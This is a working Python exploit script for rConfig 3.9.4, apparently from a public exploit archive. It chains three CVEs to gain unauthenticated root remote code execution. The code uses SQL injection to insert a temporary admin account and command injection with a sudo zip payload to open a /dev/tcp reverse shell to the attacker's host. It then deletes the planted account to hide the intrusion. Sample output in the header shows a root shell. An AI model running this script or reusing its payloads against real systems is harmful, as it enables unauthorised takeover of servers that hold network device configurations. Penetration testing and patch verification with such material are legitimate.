# Exploit Title: rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution
# Exploit Author: vikingfr
# Greetz : Orange Cyberdefense - team CSR-SO (https://cyberdefense.orange.com)
# Date: 2020-03-12
# CVE-2019-19509 + CVE-2019-19585 + CVE-2020-10220
# Exploit link : https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_root_RCE_unauth.py
# Vendor Homepage: https://rconfig.com/ (see also : https://github.com/rconfig/rconfig)
# Software Link : https://www.rconfig.com/downloads/rconfig-3.9.4.zip
# Install scripts  :
# https://www.rconfig.com/downloads/scripts/install_rConfig.sh
# https://www.rconfig.com/downloads/scripts/centos7_install.sh
# https://www.rconfig.com/downloads/scripts/centos6_install.sh
# Version: tested v3.9.4
# Tested on: Apache/2.4.6 (CentOS 7.7) OpenSSL/1.0.2k-fips PHP/7.2.24
#
# Notes : If you want to reproduce in your lab environment follow those links :
# http://help.rconfig.com/gettingstarted/installation
# then
# http://help.rconfig.com/gettingstarted/postinstall
#
# Example :
# $ python3  rconfig_root_RCE_unauth_final.py http://1.1.1.1 1.1.1.2 3334
# rConfig - 3.9 - Unauthenticated root RCE
# [+] Adding a temporary admin user...
# [+] Authenticating as dywzxuvbah...
# [+] Logged in successfully, triggering the payload...
# [+] Check your listener !
# [+] The reverse shell seems to be opened :-)
# [+] Removing the temporary admin user...
# [+] Done.
#
# $ nc -nvlp 3334
# listening on [any] 3334 ...
# connect to [1.1.1.2] from (UNKNOWN) [1.1.1.1] 46186
# sh: no job control in this shell
# sh-4.2# id
# id
# uid=0(root) gid=0(root) groups=0(root)
# sh-4.2#

#!/usr/bin/python3
import requests
import sys
import urllib.parse
import string
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from requests.exceptions import Timeout

print ("rConfig - 3.9 - Unauthenticated root RCE")

if len(sys.argv) != 4:
    print ("[+] Usage : ./rconfig_exploit.py https://target yourIP yourPort")
    exit()

target = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

vuln_page="/commands.inc.php"
vuln_parameters="?searchOption=contains&searchField=vuln&search=search&searchColumn=command"
def generateUsername(stringLength=8):
    u= string.ascii_lowercase
    return ''.join(random.sample(u,stringLength))

print ("[+] Adding a temporary admin user...")
fake_id = str(random.randint(200,900))
fake_user = generateUsername(10)
fake_pass_md5 = "21232f297a57a5a743894a0e4a801fc3" # hash of 'admin'
fake_userid_md5 = "6c97424dc92f14ae78f8cc13cd08308d"
userleveladmin = 9 # Administrator
addUserPayload="%20;INSERT%20INTO%20`users`%20(`id`,%20`username`,%20`password`,%20`userid`,%20`userlevel`,%20`email`,%20`timestamp`,%20`status`)%20VALUES%20("+fake_id+",%20'"+fake_user+"',%20'"+fake_pass_md5+"',%20'"+fake_userid_md5+"',%209,%20'"+fake_user+"@domain.com',%201346920339,%201);--"
encoded_request = target+vuln_page+vuln_parameters+addUserPayload
firstrequest = requests.session()
exploit_req = firstrequest.get(encoded_request,verify=False)

request = requests.session()
login_info = {
    "user": fake_user,
    "pass": "admin",
    "sublogin": 1
}
print ("[+] Authenticating as "+fake_user+"...")
login_request = request.post(
    target+"/lib/crud/userprocess.php",
     login_info,
     verify=False,
     allow_redirects=True
 )

dashboard_request = request.get(target+"/dashboard.php", allow_redirects=False)

payload = ''' `touch /tmp/.'''+fake_user+'''.txt;sudo zip -q /tmp/.'''+fake_user+'''.zip /tmp/.'''+fake_user+'''.txt -T -TT '/bin/sh -i>& /dev/tcp/{0}/{1} 0>&1 #'` '''.format(ip, port)
if dashboard_request.status_code == 200:
    print ("[+] Logged in successfully, triggering the payload...")
    encoded_request = target+"/lib/ajaxHandlers/ajaxArchiveFiles.php?path={0}&ext=random".format(urllib.parse.quote(payload))
    print ("[+] Check your listener !")
    try:
        exploit_req = request.get(encoded_request,timeout=10)
    except Timeout:
        print('[+] The reverse shell seems to be opened :-)')
    else:
        print('[-] The command was not executed by the target or you forgot to open a listener...')

elif dashboard_request.status_code == 302:
    print ("[-] Wrong credentials !? Maybe admin were not added...")
    exit()

print("[+] Removing the temporary admin user...")
delUserPayload="%20;DELETE%20FROM%20`users`%20WHERE%20`username`='"+fake_user+"';--"
encoded_request = target+vuln_page+vuln_parameters+delUserPayload
lastrequest = requests.session()
exploit_req = lastrequest.get(encoded_request,verify=False)
print ("[+] Done.")